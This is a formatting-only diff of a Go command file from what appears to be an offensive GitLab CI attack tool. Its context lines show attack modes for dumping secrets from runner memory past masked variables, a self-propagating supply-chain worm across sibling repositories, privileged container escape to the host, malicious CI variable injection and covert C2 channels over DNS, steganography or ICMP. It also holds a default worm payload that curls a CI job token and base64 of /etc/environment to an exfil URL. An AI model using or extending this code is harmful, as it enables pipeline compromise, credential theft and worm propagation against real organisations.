@@ -21,10 +21,10 @@ import (
 	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
 	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
 	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
-	gitlab "gitlab.com/gitlab-org/api/client-go"
 	"github.com/mr-pmillz/gogatoz/pkg/pivot"
 	"github.com/mr-pmillz/gogatoz/pkg/store"
 	"github.com/spf13/cobra"
+	gitlab "gitlab.com/gitlab-org/api/client-go"
 )
 
 const (
@@ -187,28 +187,28 @@ var (
 	atkMemoryDumpProc   string // /proc/<pid> to dump (auto-detect if empty)
 	atkMemoryDumpFilter string // regex to filter variables (default: .*SECRET|.*TOKEN|.*KEY)
 	// Supply chain worm mode (self-propagating CI injection)
-	atkSupplyChainWorm  bool
-	atkWormPayload      string // payload to inject into sibling repos
-	atkWormMaxRepos     int    // max sibling repos to propagate to (default: 5)
-	atkWormTargetGroup  string // group ID/path to scope worm propagation
+	atkSupplyChainWorm bool
+	atkWormPayload     string // payload to inject into sibling repos
+	atkWormMaxRepos    int    // max sibling repos to propagate to (default: 5)
+	atkWormTargetGroup string // group ID/path to scope worm propagation
 	// Container escape mode (privileged Docker executor exploit)
-	atkContainerEscape  bool
-	atkEscapeMountPath  string // host path to mount (default: /)
-	atkEscapeMethod     string // sshd|docker|kernel|nsenter (default: sshd)
-	atkEscapeCommand    string // command to execute on host (default: bash)
+	atkContainerEscape bool
+	atkEscapeMountPath string // host path to mount (default: /)
+	atkEscapeMethod    string // sshd|docker|kernel|nsenter (default: sshd)
+	atkEscapeCommand   string // command to execute on host (default: bash)
 	// Variable injection mode (CI/Group variable takeover)
-	atkVariableInject   bool
-	atkInjectVars       string // JSON string of var key=value pairs to inject
-	atkInjectScope      string // project|group (default: project)
-	atkInjectGroupID    string // group ID for group-scope injection
-	atkInjectProtected  bool   // inject as protected variable
-	atkInjectMasked     bool   // inject as masked variable
+	atkVariableInject  bool
+	atkInjectVars      string // JSON string of var key=value pairs to inject
+	atkInjectScope     string // project|group (default: project)
+	atkInjectGroupID   string // group ID for group-scope injection
+	atkInjectProtected bool   // inject as protected variable
+	atkInjectMasked    bool   // inject as masked variable
 	// C2 covert channel mode (DNS tunnel, steganography, ICMP)
-	atkC2Channel        bool
-	atkC2Method         string // dns-a|dns-txt|steg-wav|steg-png|icmp (default: dns-a)
-	atkC2Target         string // domain/URL for the C2 channel
-	atkC2KeepAlive      bool   // keep C2 channel alive with heartbeats
-	atkC2CallbackURL    string // C2 callback URL
+	atkC2Channel     bool
+	atkC2Method      string // dns-a|dns-txt|steg-wav|steg-png|icmp (default: dns-a)
+	atkC2Target      string // domain/URL for the C2 channel
+	atkC2KeepAlive   bool   // keep C2 channel alive with heartbeats
+	atkC2CallbackURL string // C2 callback URL
 )
 
 // narrow interface to allow test fakes
@@ -1359,11 +1359,11 @@ var attackCmd = &cobra.Command{
 			// Shutdown listener
 			_ = listener.Stop(ctx)
 			return nil
-			}
+		}
 
-			// memory-dump mode: inject a CI job that dumps secrets from runner process memory
-			// (bypasses GitLab masked variables by reading /proc/<pid>/mem or /proc/*/environ)
-			if atkMemoryDump {
+		// memory-dump mode: inject a CI job that dumps secrets from runner process memory
+		// (bypasses GitLab masked variables by reading /proc/<pid>/mem or /proc/*/environ)
+		if atkMemoryDump {
 			if strings.TrimSpace(atkBranch) == "" {
 				atkBranch = "gogatoz-memory-dump"
 			}
@@ -1415,10 +1415,10 @@ var attackCmd = &cobra.Command{
 			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Memory dump payload committed to branch %s", finalBranch))
 			renderInfo(cmd.OutOrStdout(), "This payload will attempt to extract secrets from runner process memory")
 			return nil
-			}
+		}
 
-			// supply-chain-worm mode: self-propagating CI injection across sibling repos
-			if atkSupplyChainWorm {
+		// supply-chain-worm mode: self-propagating CI injection across sibling repos
+		if atkSupplyChainWorm {
 			wormPayload := strings.TrimSpace(atkWormPayload)
 			if wormPayload == "" {
 				wormPayload = "curl -sS -H 'PRIVATE-TOKEN: $CI_JOB_TOKEN' 'https://example.com/exfil?data=$(base64 /etc/environment)'"
@@ -1453,10 +1453,10 @@ var attackCmd = &cobra.Command{
 				renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d errors encountered", result.Errors))
 			}
 			return nil
-			}
+		}
 
-			// container-escape mode: exploit privileged Docker executor to escape to host
-			if atkContainerEscape {
+		// container-escape mode: exploit privileged Docker executor to escape to host
+		if atkContainerEscape {
 			escapeMethod := strings.ToLower(strings.TrimSpace(atkEscapeMethod))
 			if escapeMethod == "" {
 				escapeMethod = "docker"
@@ -1517,10 +1517,10 @@ var attackCmd = &cobra.Command{
 			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Method: %s with command: %s", escapeMethod, escapeCmd))
 			renderInfo(cmd.OutOrStdout(), "This job will attempt to escape the container to the host system")
 			return nil
-			}
+		}
 
-			// variable-inject mode: inject malicious CI variables into project/group scope
-			if atkVariableInject {
+		// variable-inject mode: inject malicious CI variables into project/group scope
+		if atkVariableInject {
 			if strings.TrimSpace(atkInjectVars) == "" {
 				return fmt.Errorf("--inject-vars is required (JSON: '{\"MY_SECRET\": \"value\"}')")
 			}
@@ -1550,10 +1550,10 @@ var attackCmd = &cobra.Command{
 				return fmt.Errorf("parse --inject-vars JSON: %w", err)
 			}
 			results := make([]struct {
-				Key      string `json:"key"`
-				Scope    string `json:"scope"`
-				Success  bool   `json:"success"`
-				Error    string `json:"error,omitempty"`
+				Key     string `json:"key"`
+				Scope   string `json:"scope"`
+				Success bool   `json:"success"`
+				Error   string `json:"error,omitempty"`
 			}, 0)
 			for _, v := range vars {
 				if v.Key == "" {
@@ -1628,10 +1628,10 @@ var attackCmd = &cobra.Command{
 				}
 			}
 			return nil
-			}
+		}
 
-			// c2-channel mode: establish a covert C2 channel via DNS tunnel, steganography, etc.
-			if atkC2Channel {
+		// c2-channel mode: establish a covert C2 channel via DNS tunnel, steganography, etc.
+		if atkC2Channel {
 			method := strings.ToLower(strings.TrimSpace(atkC2Method))
 			if method == "" {
 				method = "dns-a"
@@ -1690,9 +1690,9 @@ var attackCmd = &cobra.Command{
 			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("C2 channel payload committed to branch %s", finalBranch))
 			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Channel type: %s -> %s", method, target))
 			return nil
-			}
+		}
 
-			// secrets mode
+		// secrets mode
 		if atkSecrets {
 			// parse tags
 			var tags []string
